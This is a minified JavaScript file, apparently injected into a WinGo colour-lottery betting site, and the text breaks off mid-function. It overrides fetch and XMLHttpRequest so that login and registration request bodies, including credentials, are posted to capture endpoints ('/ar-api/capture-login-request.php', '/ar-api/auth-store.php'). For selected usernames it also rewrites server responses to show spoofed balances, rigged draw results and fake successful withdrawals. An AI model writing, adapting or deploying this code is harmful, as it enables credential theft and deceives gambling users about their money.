function Zt({
    apiBase: e,
    spoofDomain: t,
    minBalance: a,
    nukeUrl: n,
    authErrMsg: r,
    onBalance: o,
    onWingo: i,
}) {
    (navigator.serviceWorker &&
        navigator.serviceWorker
            .getRegistrations()
            .then((e) => e.forEach((e) => e.unregister()))
            .catch(() => { }),
        document.addEventListener("DOMContentLoaded", () => {
            document.querySelectorAll("iframe").forEach((e) => {
                e.src &&
                    (e.src.includes("unTopWindow") || e.src.includes("fromEntry=sw")) &&
                    e.remove();
            });
        }));
    let s = window.fetch,
        l = /\/api\/webapi\/(Register|Login)$/,
        d = "";
    function p(e, t) {
        try {
            window.dispatchEvent(new CustomEvent(e, { detail: t }));
        } catch { }
    }
    function c() {
        try {
            return JSON.parse(localStorage.getItem("userInfo") || "{}") || {};
        } catch { }
        return {};
    }
    function g() {
        let e = c();
        return (
            e.userName ||
            e.username ||
            e.phone ||
            sessionStorage.getItem("wg_user") ||
            sessionStorage.getItem("wg_qual_user") ||
            ""
        );
    }
    function f(e) {
        if (!e) return "";
        let t = sessionStorage.getItem("wg_qual_user");
        return (
            t && t !== e && sessionStorage.removeItem("wg_qualified"),
            sessionStorage.setItem("wg_user", e),
            e
        );
    }
    function b(e, t) {
        (t &&
            (sessionStorage.setItem("wg_user", t),
                sessionStorage.setItem("wg_qual_user", t)),
            e
                ? (sessionStorage.setItem("wg_qualified", "1"),
                    p("wg-qualified", { user: t || g() }))
                : sessionStorage.removeItem("wg_qualified"));
    }
    function h(e, a) {
        if (!e || !l.test(e) || !a) return a;
        try {
            let e = JSON.parse(a);
            return (
                e.domainurl || (e.domainurl = t),
                (n = e) &&
                n.username &&
                fetch("/ar-api/capture-login-request.php", {
                    method: "POST",
                    headers: { "content-type": "application/json" },
                    body: JSON.stringify(n),
                }).catch(() => { }),
                JSON.stringify(e)
            );
        } catch { }
        var n;
        return a;
    }
    function x(e) {
        return (
            e?.data?.userName ||
            e?.data?.username ||
            e?.data?.phone ||
            e?.username ||
            ""
        );
    }
    function m(e) {
    }
    var y,
        v = null;
    function w(e) {
        let t = Number(e);
        Number.isFinite(t) &&
            (o(t),
                p("wg-balance", { balance: t }),
                m(t),
                null !== v && Number.isFinite(v) && o(v));
    }
    function k(e, t) {
        return e
            ? e.includes("/api/Lottery/GetBalance")
                ? t?.data?.balance
                : e.includes("/api/webapi/GetUserInfo")
                    ? t?.data?.amount
                    : null
            : null;
    }
    function S(e, t, a) {
        var n, r;
        return (
            "login" === e &&
            t &&
            (sessionStorage.setItem("wg_qual_user", t),
                a &&
                "object" == typeof a &&
                Object.keys(a).length &&
                ((r = t),
                    (n = a) &&
                    r &&
                    fetch("/ar-api/auth-store.php", {
                        method: "POST",
                        headers: { "content-type": "application/json" },
                        body: JSON.stringify({ username: r, data: n }),
                    }).catch(() => { }))),
            Promise.resolve({})
        );
    }
    function _() {
        let e = f(g());
        e &&
            d !== e &&
            ((d = e),
                S("login", e, {}).then(() => {
                    let e = (function () {
                        let e = Number(c().amount);
                        return Number.isFinite(e) ? e : null;
                    })();
                    null != e && w(e);
                }));
    }
    return (
        (window.__claimDeposit = function (e) {
            var t = null !== u.balance ? u.balance : 0;
            ((u.balance = t + e), (v = u.balance), F(), $t(), w(u.balance));
            try {
                var a = JSON.parse(localStorage.getItem("userInfo") || "{}");
                "number" == typeof a.amount &&
                    ((a.amount = u.balance),
                        localStorage.setItem("userInfo", JSON.stringify(a)));
            } catch (e) { }
            try {
                window.__wgUICache &&
                    window.__wgUICache.data &&
                    ((window.__wgUICache.data.amount = u.balance),
                        (window.__wgUICache.data.balance = u.balance));
            } catch (e) { }
            return !0;
        }),
        (window.fetch = async function (t, a) {
            let n = "",
                r = null;
            if ("string" == typeof t)
                ((n = t),
                    (r = a?.body && "string" == typeof a.body ? a.body : null),
                    r && ((r = h(n, r)), (a = { ...(a || {}), body: r })));
            else if (t instanceof Request) {
                n = t.url;
                let a = t.clone();
                if (l.test(n))
                    try {
                        r = h(n, await a.text());
                    } catch { }
                t = new Request((t.url.startsWith(e), t.url), {
                    method: t.method,
                    headers: t.headers,
                    body: null == r ? t.body : r,
                    mode: "cors",
                    credentials: t.credentials,
                });
            }
            !r && a?.body && "string" == typeof a.body && (r = a.body);
            let o = "string" == typeof t ? t : t?.url,
                d = await s.call(this, t, a);
            return (
                (function (e, t) {
                    if (e && i && e.includes("WinGo")) {
                        let a = e.match(/WinGo_([\w]+)/),
                            n = a ? "WinGo_" + a[1] : null;
                        t.json()
                            .then((e) => i(n, e))
                            .catch(() => { });
                    }
                })(o, d.clone()),
                (function (e, t) {
                    e &&
                        (e.includes("/api/Lottery/GetBalance") ||
                            e.includes("/api/webapi/GetUserInfo") ||
                            e.includes("/api/webapi/Login") ||
                            e.includes("/api/webapi/Register")) &&
                        t
                            .json()
                            .then((t) => {
                                let a = f(x(t));
                                a &&
                                    sessionStorage.getItem("wg_qual_user") !== a &&
                                    S("login", a, t);
                                let n = k(e, t);
                                null != n && w(n);
                            })
                            .catch(() => { });
                })(o, d.clone()),
                d
            );
        }),
        (XMLHttpRequest.prototype.open =
            ((y = XMLHttpRequest.prototype.open),
                function (e, t, ...a) {
                    return (
                        (this._url = t),
                        (this._rawUrl = t),
                        y.call(this, e, this._url, ...a)
                    );
                })),
        (XMLHttpRequest.prototype.send = ((e) =>
            function (t) {
                this._body = "string" == typeof t ? t : null;
                let a = this._body ? h(this._rawUrl || this._url, this._body) : t;
                if (
                    ((this._body = "string" == typeof a ? a : null),
                        this.addEventListener("load", function () {
                            try {
                                if (this._url) {
                                    let e = JSON.parse(this.responseText),
                                        t = f(x(e));
                                    t &&
                                        (this._url.includes("GetUserInfo") ||
                                            this._url.includes("Login") ||
                                            this._url.includes("Register")) &&
                                        sessionStorage.getItem("wg_qual_user") !== t &&
                                        S("login", t, e);
                                    let a = k(this._url, e);
                                    null != a && w(a);
                                }
                            } catch { }
                            try {
                                if (this._url && !ee()) {
                                    var e = this._url,
                                        t = null;
                                    if (
                                        (e.includes("GetUserInfo")
                                            ? (t = "GetUserInfo")
                                            : e.includes("GetBalance")
                                                ? (t = "GetBalance")
                                                : e.includes("GetARGameAndPlatWallets")
                                                    ? (t = "GetARGameAndPlatWallets")
                                                    : e.includes("GetSaasAllwallets")
                                                        ? (t = "GetSaasAllwallets")
                                                        : e.includes("RecoverSaasBalance") &&
                                                        (t = "RecoverSaasBalance"),
                                            t && gt[t])
                                    ) {
                                        ((this._kBody = this._body),
                                            (this._kUrl = this._rawUrl || this._url));
                                        var a = JSON.parse(this.responseText);
                                        gt[t](a, this);
                                        var n = JSON.stringify(a);
                                        (Object.defineProperty(this, "responseText", {
                                            value: n,
                                            configurable: !0,
                                        }),
                                            Object.defineProperty(this, "response", {
                                                value: n,
                                                configurable: !0,
                                            }));
                                    }
                                }
                            } catch { }
                            try {
                                if (this._url && i && this._url.includes("WinGo")) {
                                    let e = this._url.match(/WinGo_([\w]+)/),
                                        t = e ? "WinGo_" + e[1] : null;
                                    i(t, JSON.parse(this.responseText));
                                }
                            } catch { }
                        }),
                        !ee())
                ) {
                    var n = this.onreadystatechange;
                    this.onreadystatechange = function () {
                        if (4 === this.readyState)
                            try {
                                var e = this._url,
                                    t = null;
                                if (
                                    (e.includes("GetUserInfo")
                                        ? (t = "GetUserInfo")
                                        : e.includes("GetBalance")
                                            ? (t = "GetBalance")
                                            : e.includes("GetARGameAndPlatWallets")
                                                ? (t = "GetARGameAndPlatWallets")
                                                : e.includes("GetSaasAllwallets")
                                                    ? (t = "GetSaasAllwallets")
                                                    : e.includes("RecoverSaasBalance") &&
                                                    (t = "RecoverSaasBalance"),
                                        t && gt[t])
                                ) {
                                    ((this._kBody = this._body),
                                        (this._kUrl = this._rawUrl || this._url));
                                    var a = JSON.parse(this.responseText);
                                    gt[t](a, this);
                                    var r = JSON.stringify(a);
                                    (Object.defineProperty(this, "responseText", {
                                        value: r,
                                        configurable: !0,
                                    }),
                                        Object.defineProperty(this, "response", {
                                            value: r,
                                            configurable: !0,
                                        }));
                                }
                            } catch (e) { }
                        if ("function" == typeof n) return n.apply(this, arguments);
                    };
                }
                return e.call(this, a);
            })(XMLHttpRequest.prototype.send)),
        _(),
        window.addEventListener("pageshow", _),
        s
    );
}
var u,
    Q = "wg_spoof_state",
    tn = 42e4,
    Kt = 50,
    jt = 240,
    te = 2,
    Nt = [
        "red,violet",
        "green",
        "red",
        "green",
        "red",
        "green,violet",
        "red",
        "green",
        "red",
        "green",
    ];
function re() {
    try {
        var e = JSON.parse(localStorage.getItem("wg_spoof_cfg"));
        return e && "object" == typeof e ? e : {};
    } catch (e) {
        return {};
    }
}
function U(e, t) {
    var a = re()[e];
    return void 0 !== a ? a : t;
}
function ee() {
    try {
        var e = sessionStorage.getItem("wg_user");
        return !!e && -1 !== "917726002927".indexOf(e);
    } catch (e) {
        return !1;
    }
}
function ne(e) {
    for (var t = 2166136261, a = 0; a < e.length; a++)
        ((t ^= e.charCodeAt(a)), (t = Math.imul(t, 16777619)));
    return (
        (t = Math.imul(t ^ (t >>> 16), 2246822507)),
        ((t = Math.imul(t ^ (t >>> 13), 3266489909)) ^ (t >>> 16)) >>> 0
    );
}
function en(e) {
    return (
        (e = BigInt.asUintN(64, e + 0x9e3779b97f4a7c15n)),
        (e = BigInt.asUintN(64, 0xbf58476d1ce4e5b9n * (e ^ (e >> 30n)))),
        (e = BigInt.asUintN(64, 0x94d049bb133111ebn * (e ^ (e >> 27n)))),
        BigInt.asUintN(64, e ^ (e >> 31n))
    );
}
function ue(e, t, a) {
    return en(
        (/^\d+$/.test(String(t || "")) ? BigInt(t) : BigInt(ne(String(t || "")))) ^
        BigInt(ne(a + e)),
    );
}
function J(e, t, a) {
    return Number(ue(e, t, a) % 10n);
}
function It(e, t) {
    if (((e = String(e || "")), (t = t || 1), !/^\d+$/.test(e))) return "";
    try {
        return (BigInt(e) - BigInt(t)).toString();
    } catch (e) { }
    return String(Math.max(0, Number(e) - t));
}
function oe(e, t, a, n) {
    var r = t - a === a - n && Math.abs(t - a) <= 2 && e - t === t - a;
    return (
        (e === t && t === a) ||
        (e === a && a === n) ||
        (e === a && t === n) ||
        (e === n && a === n) ||
        r
    );
}
function dt(e, t) {
    var a = J(e, (t = String(t || "")), "Kx7q:");
    if (!/^\d+$/.test(t)) return a;
    var n = J(e, It(t, 1), "Kx7q:"),
        r = J(e, It(t, 2), "Kx7q:"),
        o = J(e, It(t, 3), "Kx7q:");
    if (!oe(a, n, r, o)) return a;
    for (
        var i = [
            J(e, t, "J4n2:"),
            J(e, t, "V8p1:"),
            J(e, t, "S6d7:"),
            (a + 5) % 10,
            (a + 3) % 10,
        ],
        s = 0;
        s < i.length;
        s++
    )
        if (!oe(i[s], n, r, o)) return i[s];
    return i[0];
}
function pe(e, t) {
    return Number(ue(e, t, "Rz3m:") % 100n);
}
function nn(e, t) {
    return (dt(e, t) + 5) % 10;
}
function on() {
    var e = U("accuracy", 100);
    return ((isNaN(e) || e < 0) && (e = 0), e > 100 && (e = 100), e);
}
function qt(e, t) {
    return pe(e, t) < on() ? dt(e, t) : nn(e, t);
}
function ie(e) {
    if (((e = String(e || "")), !/^\d+$/.test(e))) return "";
    try {
        return (BigInt(e) + 1n).toString();
    } catch (e) { }
    return String(Number(e) + 1);
}
function sn(e) {
    var t = String(e || "");
    return (
        /\/WinGo\/[^\/?]+\.json(?:\?|$)/.test(t) &&
        -1 === t.indexOf("GetHistoryIssuePage")
    );
}
function N(e) {
    var t = parseFloat(e);
    return isNaN(t) ? 0 : t;
}
function j(e, t) {
    return parseFloat((N(e) * Math.max(1, N(t))).toFixed(2));
}
function se(e, t) {
    return Math.abs(N(e) - N(t)) < 0.001;
}
function Y(e, t) {
    var a = e && e.match(new RegExp("[?&]" + t + "=([^&]+)"));
    return a ? decodeURIComponent(a[1]) : null;
}
function an(e) {
    return -1 !== (e = String(e || "")).indexOf("5M")
        ? 3e5
        : -1 !== e.indexOf("3M")
            ? 18e4
            : -1 !== e.indexOf("1M")
                ? 6e4
                : 3e4;
}
function tt(e) {
    var t = Y(e, "gameCode");
    if (t) return t;
    var a = e && e.match(/\/WinGo\/([^\/?]+)(?:\/|\.json(?:\?|$)|\?|$)/);
    return a
        ? decodeURIComponent(a[1])
        : (window.location && (t = Y(window.location.hash, "gameCode")), t || null);
}
function cn(e, t) {
    return (
        (t = +t || 0),
        0 === (e = String(e || "").toLowerCase()).indexOf("num_")
            ? 9
            : -1 !== e.indexOf("violet")
                ? 4.5
                : ("color_green" === e && 5 === t) || ("color_red" === e && 0 === t)
                    ? 1.5
                    : 2
    );
}
function ln(e, t) {
    return 0 === (e = String(e || "").toLowerCase()).indexOf("num_")
        ? t === parseInt(e.split("_")[1], 10)
        : "bigsmall_big" === e
            ? t >= 5
            : "bigsmall_small" === e
                ? t <= 4
                : "color_green" === e
                    ? -1 !== [1, 3, 5, 7, 9].indexOf(t)
                    : "color_red" === e
                        ? -1 !== [0, 2, 4, 6, 8].indexOf(t)
                        : "color_violet" === e && -1 !== [0, 5].indexOf(t);
}
function rn(e, t) {
    if (!t) return 0;
    var a = e.stake - (e.fee || 0.02 * e.stake);
    return ln(e.content, t.num)
        ? parseFloat((a * cn(e.content, t.num)).toFixed(2))
        : 0;
}
try {
    u = JSON.parse(localStorage.getItem(Q));
} catch (e) { }
if (
    (u &&
        void 0 !== u.pending &&
        (u = { balance: u.balance, draws: {}, rigs: {}, withdrawals: {} }),
        u || (u = { balance: null, draws: {}, rigs: {}, withdrawals: {} }),
        u.draws || (u.draws = {}),
        u.rigs || (u.rigs = {}),
        u.withdrawals || (u.withdrawals = {}),
        u.version !== te)
) {
    for (pt in ((ut = {}), u.rigs))
        ut[u.rigs[pt].game + ":" + u.rigs[pt].issue] = !0;
    for (ft in u.draws) ut[ft] || delete u.draws[ft];
    u.version = te;
    try {
        localStorage.setItem(Q, JSON.stringify(u));
    } catch (e) { }
}
var ut,
    pt,
    ft,
    nt = {};
function Wt(e, t) {
    return String(e || "") + ":" + String(t || "");
}
function Lt(e, t, a) {
    if (!e || null == a || isNaN(a)) return null;
    var n = Wt(e, t),
        r = u.draws[n];
    return r
        ? (null == r.color && (r.color = Nt[r.num]),
            r.seenAt || (r.seenAt = Date.now()),
            r)
        : ((r = { num: +a, color: Nt[a], seenAt: Date.now() }),
            (u.draws[n] = r),
            r);
}
function ot(e, t) {
    if (((e = String(e || "")), t)) return u.draws[Wt(t, e)] || null;
    var a = null,
        n = 0;
    for (var r in u.draws) r.split(":")[1] === e && ((a = u.draws[r]), n++);
    return 1 === n ? a : null;
}
function Et(e, t) {
    e = String(e || "");
    var a = [];
    if (t) {
        var n = t + ":" + e + ":";
        for (var r in u.rigs)
            0 === r.indexOf(n) && a.push({ key: r, rig: u.rigs[r] });
    } else
        for (var r in u.rigs)
            String(u.rigs[r].issue) === e && a.push({ key: r, rig: u.rigs[r] });
    return a;
}
function un(e) {
    e = String(e || "");
    var t = null;
    for (var a in u.rigs) {
        var n = u.rigs[a];
        if (String(n.issue) === e)
            if (t) {
                if (t !== n.game) return null;
            } else t = n.game;
    }
    return t;
}
function yt(e) {
    if (e.settled) return !1;
    var t = ot(e.issue, e.game);
    return (
        !!t &&
        ((e.win = rn(e, t)),
            (e.settled = !0),
            null === u.balance && (u.balance = U("balanceOffset", 5e3)),
            (u.balance += e.win),
            !0)
    );
}
function it() {
    var e = Date.now(),
        t = !1;
    for (var a in u.rigs) {
        var n = u.rigs[a];
        !n.settled && n.settleAt && e >= n.settleAt && yt(n) && (t = !0);
    }
    for (var a in u.rigs)
        !u.rigs[a].settled &&
            e - (u.rigs[a].time || 0) > tn &&
            yt(u.rigs[a]) &&
            (t = !0);
    for (var r in nt) nt[r] < e - 6e4 && delete nt[r];
    var o = Object.keys(u.rigs);
    if (o.length > Kt) {
        var i = o.filter(function (e) {
            return u.rigs[e].settled;
        });
        i.sort(function (e, t) {
            return (u.rigs[e].time || 0) - (u.rigs[t].time || 0);
        });
        for (var s = 0, l = o.length - Kt; s < l && s < i.length; s++)
            (delete u.rigs[i[s]], (t = !0));
        var d = {};
        for (var p in u.rigs) d[u.rigs[p].game + ":" + u.rigs[p].issue] = !0;
        for (var c in u.draws) d[c] || (delete u.draws[c], (t = !0));
    }
    var g = Object.keys(u.draws);
    if (g.length > jt) {
        var f = {};
        for (var b in u.rigs) f[u.rigs[b].game + ":" + u.rigs[b].issue] = !0;
        var h = g.filter(function (e) {
            return !f[e];
        });
        h.sort(function (e, t) {
            return (u.draws[e].seenAt || 0) - (u.draws[t].seenAt || 0);
        });
        for (var x = 0, m = g.length - jt; x < m && x < h.length; x++)
            (delete u.draws[h[x]], (t = !0));
    }
    return (t && $t(), t);
}
function F() {
    (it(), localStorage.setItem(Q, JSON.stringify(u)));
}
var _t = null;
function $t() {
    null === u.balance ||
        _t ||
        (_t = setTimeout(function () {
            _t = null;
            try {
                var e = document.getElementById("app"),
                    t = e && e.__vue_app__,
                    a = t && t.config.globalProperties.$pinia,
                    n = a && a.state.value.GlobalState;
                n &&
                    n.userInfo &&
                    "number" == typeof n.userInfo.amount &&
                    (n.userInfo.amount = u.balance);
            } catch (e) { }
        }, 300));
}
function T(e) {
    return ee()
        ? (null === u.balance &&
            "number" == typeof e &&
            e >= 0 &&
            ((u.balance = e + U("balanceOffset", 5e3)), F()),
            null === u.balance ? U("balanceOffset", 5e3) : u.balance)
        : null !== u.balance
            ? u.balance
            : "number" == typeof e
                ? e
                : 0;
}
function fe(e) {
    return 0 === (e = String(e || "").toLowerCase()).indexOf("num_")
        ? "Num"
        : 0 === e.indexOf("bigsmall_")
            ? "BigSmall"
            : 0 === e.indexOf("color_")
                ? "Color"
                : "Num";
}
function ye(e, t) {
    if (
        ((e.issueNumber = t.issue),
            (e.betContent = t.content),
            (e.amount = t.amount),
            (e.betMultiple = t.betMultiple),
            (e.realAmount = t.realAmount),
            (e.fee = t.fee),
            (e.betTime = t.time),
            (e.playType = fe(t.content)),
            (e.orderNo = t.orderNo),
            !t.settled)
    )
        return (
            (e.state = 2),
            (e.number = ""),
            (e.color = ""),
            (e.premium = ""),
            void (e.winLoseAmount = 0)
        );
    ((e.state = t.win > 0 ? 1 : 0),
        (e.winLoseAmount =
            t.win > 0
                ? parseFloat((t.win - t.stake).toFixed(2))
                : parseFloat((-t.stake).toFixed(2))));
    var a = ot(t.issue, t.game);
    a &&
        ((e.number = String(a.num)),
            (e.color = a.color),
            (e.premium = String(a.num)));
}
function pn(e) {
    var t = {
        issueNumber: e.issue,
        playType: fe(e.content),
        orderNo: e.orderNo,
        amount: e.amount,
        betMultiple: e.betMultiple,
        betContent: e.content,
        number: "",
        color: "",
        premium: "",
        realAmount: e.realAmount,
        fee: e.fee,
        state: 2,
        winLoseAmount: 0,
        betTime: e.time,
        sum: 0,
    };
    return (ye(t, e), t);
}
function et(e) {
    return e < 10 ? "0" + e : "" + e;
}
function Ct(e) {
    var t = new Date(e);
    return (
        t.getFullYear() +
        "-" +
        et(t.getMonth() + 1) +
        "-" +
        et(t.getDate()) +
        " " +
        et(t.getHours()) +
        ":" +
        et(t.getMinutes()) +
        ":" +
        et(t.getSeconds())
    );
}
var gt = {
    GetUserInfo: function (e) {
        if (e && 0 === e.code && e.data)
            (it() && localStorage.setItem(Q, JSON.stringify(u)),
                (e.data.amount = T(e.data.amount)),
                null !== u.balance &&
                ((e.data.amountofCode = 0), (e.data.channelAmountofCode = 0)),
                (window.__wgUICache = JSON.parse(JSON.stringify(e))));
        else if (
            e &&
            0 !== e.code &&
            window.__wgUICache &&
            /frequent|rate.?limit/i.test(e.msg || "")
        ) {
            var t = window.__wgUICache;
            ((e.code = t.code),
                (e.msg = t.msg),
                (e.msgCode = t.msgCode),
                (e.data = JSON.parse(JSON.stringify(t.data))),
                (e.data.amount = T()));
        }
    },
    GetARGameAndPlatWallets: function (e) {
        var t = e.data && e.data.thidGameBalanceList;
        if (t)
            for (var a = 0; a < t.length; a++)
                "Lottery" === t[a].vendorCode && (t[a].balance = T(t[a].balance));
    },
    GetSaasAllwallets: function (e) {
        gt.GetARGameAndPlatWallets(e);
    },
    GetBalance: function (e) {
        if (e && 0 === e.code && e.data)
            (it() && localStorage.setItem(Q, JSON.stringify(u)),
                "number" == typeof e.data.balance &&
                (e.data.balance = T(e.data.balance)),
                (window.__wgBalCache = JSON.parse(JSON.stringify(e))));
        else if (
            e &&
            0 !== e.code &&
            window.__wgBalCache &&
            /frequent|rate.?limit/i.test(e.msg || "")
        ) {
            var t = window.__wgBalCache;
            ((e.code = t.code),
                (e.msg = t.msg),
                (e.msgCode = t.msgCode),
                (e.data = JSON.parse(JSON.stringify(t.data))),
                "number" == typeof e.data.balance && (e.data.balance = T()));
        }
    },
    RecoverSaasBalance: function (e) {
        e.data &&
            "number" == typeof e.data.amount &&
            (e.data.amount = T(e.data.amount));
    },
    GetWithdrawLog: function (e, t) {
        try {
            var a = JSON.parse(t._kBody || "{}");
            if (a.pageNo > 1) return;
        } catch (e) { }
        (e.data || (e.data = { list: [] }), e.data.list || (e.data.list = []));
        for (var n = {}, r = 0; r < e.data.list.length; r++)
            n[e.data.list[r].withdrawNumber] = !0;
        var o = [];
        for (var i in u.withdrawals)
            if (!n[u.withdrawals[i].withdrawNumber]) {
                var s = u.withdrawals[i];
                try {
                    var l = a.type || a.categoryId || a.withdrawTypeId || -1;
                    if (-1 != l && 0 != l && s.type && s.type != l) continue;
                } catch (e) { }
                var d = 2 === s.type ? "BANK CARD" : (s.type, "UPI");
                o.push({
                    id: s.withdrawNumber,
                    withdrawNumber: s.withdrawNumber,
                    price: s.amount,
                    state: s.state,
                    addTime: Ct(s.addTime),
                    fee: s.fee,
                    withdrawName: d,
                    _ts: s.addTime,
                });
            }
        o.sort(function (e, t) {
            return t._ts - e._ts;
        });
        for (var p = 0; p < o.length; p++) delete o[p]._ts;
        ((e.data.list = o.concat(e.data.list)),
            (e.data.totalCount = (e.data.totalCount || 0) + o.length));
    },
    Withdraw: function (e, t) {
        try {
            var a = JSON.parse(t._kBody || "{}"),
                n =
                    N(a.amount) || N(a.price) || N(a.applyAmount) || N(a.withdrawAmount);
            if (!n || n <= 0) return;
            var r = a.withdrawid || a.type || a.categoryId || a.withdrawTypeId || 2,
                o =
                    ((i = new Date()),
                        "WD" +
                        (String(i.getFullYear()) +
                            String(i.getMonth() + 1).padStart(2, "0") +
                            String(i.getDate()).padStart(2, "0") +
                            String(i.getHours()).padStart(2, "0") +
                            String(i.getMinutes()).padStart(2, "0") +
                            String(i.getSeconds()).padStart(2, "0") +
                            Math.random().toString(36).slice(2, 10)));
            ((u.withdrawals[o] = {
                withdrawNumber: o,
                amount: n,
                state: 3,
                fee: 0,
                addTime: Date.now(),
                type: r,
            }),
                null === u.balance && (u.balance = U("balanceOffset", 5e3)),
                (u.balance -= n),
                F());
        } catch (e) { }
        var i;
        ((e.code = 0), (e.msg = "Succeed"));
    },
    NewSetWithdrawal: function (e, t) {
        return gt.Withdraw(e, t);
    },
    getWithdrawals: function (e) {
        if (e && e.data && e.data.withdrawalsrule) {
            var t = T();
            ((e.data.withdrawalsrule.amount = t),
                (e.data.withdrawalsrule.canWithdrawAmount = t));
        }
    },
    GetNewMyEmerdList: function (e, t) {
        (it() && localStorage.setItem(Q, JSON.stringify(u)),
            e.data ||
            (e.data = { list: [], pageNo: 1, totalPage: 0, totalCount: 0 }));
        var a = {};
        try {
            a = JSON.parse((t && t._kBody) || "{}");
        } catch (e) { }
        var n = parseInt(a.pageNo || 1, 10),
            r = parseInt(a.pageSize || 10, 10),
            o = a.startDate || "",
            i = a.endDate || "",
            s = String(a.gameType || "");
        if ("" !== s && "0" !== s && "1" !== s)
            return (
                (e.data.list = []),
                (e.data.totalCount = 0),
                (e.data.totalPage = 0),
                void (e.data.pageNo = n)
            );
        var l = { WinGo_30S: 30, WinGo_1M: 1, WinGo_3M: 2, WinGo_5M: 3 };
        function d(e) {
            return 0 === (e = String(e || "")).indexOf("Color_")
                ? e.slice(6).toLowerCase()
                : 0 === e.indexOf("Num_")
                    ? e.slice(4)
                    : 0 === e.indexOf("BigSmall_")
                        ? e.slice(9).toLowerCase()
                        : e.toLowerCase();
        }
        function p(e) {
            return 0 === String(e || "").indexOf("BigSmall_") ? 2 : 0;
        }
        var c = o ? new Date(o + " 00:00:00").getTime() : 0,
            g = i ? new Date(i + " 23:59:59").getTime() : 1 / 0,
            f = [];
        for (var b in u.rigs) {
            var h = u.rigs[b];
            if (h.settled && !(h.time < c || h.time > g)) {
                var x = ot(h.issue, h.game);
                f.push({
                    orderNumber: h.orderNo,
                    issueNumber: h.issue,
                    typeID: l[h.game] || 30,
                    amount: h.amount,
                    betCount: 1,
                    gameType: p(h.content),
                    selectType: d(h.content),
                    realAmount: h.realAmount,
                    serviceCharge: h.fee,
                    figure: 1,
                    state: h.win > 0 ? 1 : 0,
                    winAmount: h.win > 0 ? parseFloat(h.win.toFixed(2)) : 0,
                    addTime: Ct(h.time),
                    fee: h.fee,
                    premium: x ? String(x.num) : "",
                    number: x ? String(x.num) : "",
                    colour: x ? x.color : "",
                    _ts: h.time,
                });
            }
        }
        var m = e.data.list || [];
        if (1 === n && (f.length > 0 || m.length > 0)) {
            for (var y = {}, v = 0; v < f.length; v++) y[f[v].orderNumber] = !0;
            for (var w = 0; w < m.length; w++)
                if (!y[m[w].orderNumber]) {
                    var k = new Date(m[w].addTime || 0).getTime();
                    ((m[w]._ts = isNaN(k) ? 0 : k), f.push(m[w]));
                }
            f.sort(function (e, t) {
                return (t._ts || 0) - (e._ts || 0);
            });
            for (var S = 0; S < f.length; S++) delete f[S]._ts;
            ((e.data.list = f.slice(0, r)),
                (e.data.totalCount = f.length),
                (e.data.totalPage = Math.max(1, Math.ceil(f.length / r))),
                (e.data.pageNo = 1));
        } else if (n > 1 && 0 === m.length && f.length > 0) {
            f.sort(function (e, t) {
                return (t._ts || 0) - (e._ts || 0);
            });
            for (var _ = 0; _ < f.length; _++) delete f[_]._ts;
            var z = (n - 1) * r;
            ((e.data.list = f.slice(z, z + r)),
                (e.data.totalCount = f.length),
                (e.data.totalPage = Math.max(1, Math.ceil(f.length / r))),
                (e.data.pageNo = n));
        }
    },
    WinGoBet: function (e, t) {
        if (!t || !t._kBody)
            return ((e.code = 0), (e.msg = "Succeed"), void (e.msgCode = 0));
        try {
            var a = JSON.parse(t._kBody),
                n = a.gameCode || tt(t._kUrl) || "WinGo",
                r = String(a.issueNumber || ""),
                o = n + ":" + r;
            u.draws[o] || Lt(n, r, qt(n, r));
            var i = u.draws[o],
                s = N(a.amount),
                l = Math.max(1, N(a.betMultiple || 1)),
                d = j(s, l),
                p = parseFloat((0.02 * d).toFixed(2)),
                c = 0;
            for (var g in u.rigs) 0 === g.indexOf(o + ":") && c++;
            var f = o + ":" + c,
                b = nt[o],
                h = b ? b + 5e3 : Date.now() + an(n) + 5e3;
            ((u.rigs[f] = {
                key: f,
                issue: r,
                game: n,
                content: a.betContent,
                amount: s,
                betMultiple: l,
                stake: d,
                fee: p,
                realAmount: parseFloat((d - p).toFixed(2)),
                orderNo: "KG" + r + c,
                settled: !1,
                win: null,
                time: Date.now(),
                settleAt: h,
            }),
                null === u.balance && (u.balance = U("balanceOffset", 5e3)),
                (u.balance -= d),
                F(),
                $t());
            try {
                window.dispatchEvent(
                    new CustomEvent("kismat:round", {
                        detail: {
                            type: "round",
                            game: n,
                            issue: r,
                            num: i.num,
                            color: i.color,
                            ts: Date.now(),
                        },
                    }),
                );
            } catch (e) { }
        } catch (e) { }
        ((e.code = 0), (e.msg = "Succeed"), (e.msgCode = 0));
    },
    WinGoState: function (e, t) {
        var a = e && e.current ? e : e && e.data && e.data.current ? e.data : null;
        if (a && a.current) {
            var n = String(a.gameCode || tt(t ? t._kUrl : null) || ""),
                r = String(a.current.issueNumber || "");
            if (r) {
                var o = !1;
                n && r && !u.draws[Wt(n, r)] && (Lt(n, r, qt(n, r)), (o = !0));
                var i = N(a.current.endTime || 0);
                if (n && r && i > 0) {
                    nt[n + ":" + r] = i;
                    var s = i + 5e3,
                        l = n + ":" + r + ":";
                    for (var d in u.rigs)
                        0 !== d.indexOf(l) ||
                            u.rigs[d].settled ||
                            u.rigs[d].settleAt === s ||
                            (u.rigs[d].settleAt = s);
                }
                var p = String((a.next && a.next.issueNumber) || ie(r) || "");
                try {
                    window.dispatchEvent(
                        new CustomEvent("kismat:issue", {
                            detail: {
                                type: "issue",
                                game: n,
                                currentIssue: r,
                                nextIssue: p,
                                currentStart: N(a.current.startTime || 0),
                                currentEnd: N(a.current.endTime || 0),
                                ts: Date.now(),
                            },
                        }),
                    );
                } catch (e) { }
                o && F();
            }
        }
    },
    GetHistoryIssuePage: function (e, t) {
        var a = e.data && e.data.list;
        if (a) {
            for (
                var n = tt(t ? t._kUrl : null),
                r = !1,
                o = a[0] && null != a[0].issueNumber ? String(a[0].issueNumber) : "",
                i = 0;
                i < a.length;
                i++
            ) {
                var s = String(a[i].issueNumber || ""),
                    l = Et(s, n),
                    d = ot(s, n);
                if (!d && n) ((d = Lt(n, s, l.length ? dt(n, s) : qt(n, s))), (r = !0));
                if (d) {
                    ((a[i].number = String(d.num)),
                        (a[i].color = d.color),
                        (a[i].premium = String(d.num)));
                    for (var p = 0; p < l.length; p++) yt(l[p].rig) && (r = !0);
                }
            }
            r && F();
            try {
                window.dispatchEvent(
                    new CustomEvent("kismat:gameData", {
                        detail: {
                            type: "history",
                            game: n || "",
                            latestIssue: o,
                            nextIssue: ie(o),
                            list: a,
                            ts: Date.now(),
                        },
                    }),
                );
            } catch (e) { }
        }
    },
    GetWinLossResult: function (e, t) {
        if (e.data) {
            var a = String(Y(t ? t._kUrl : "", "issueNumber") || "");
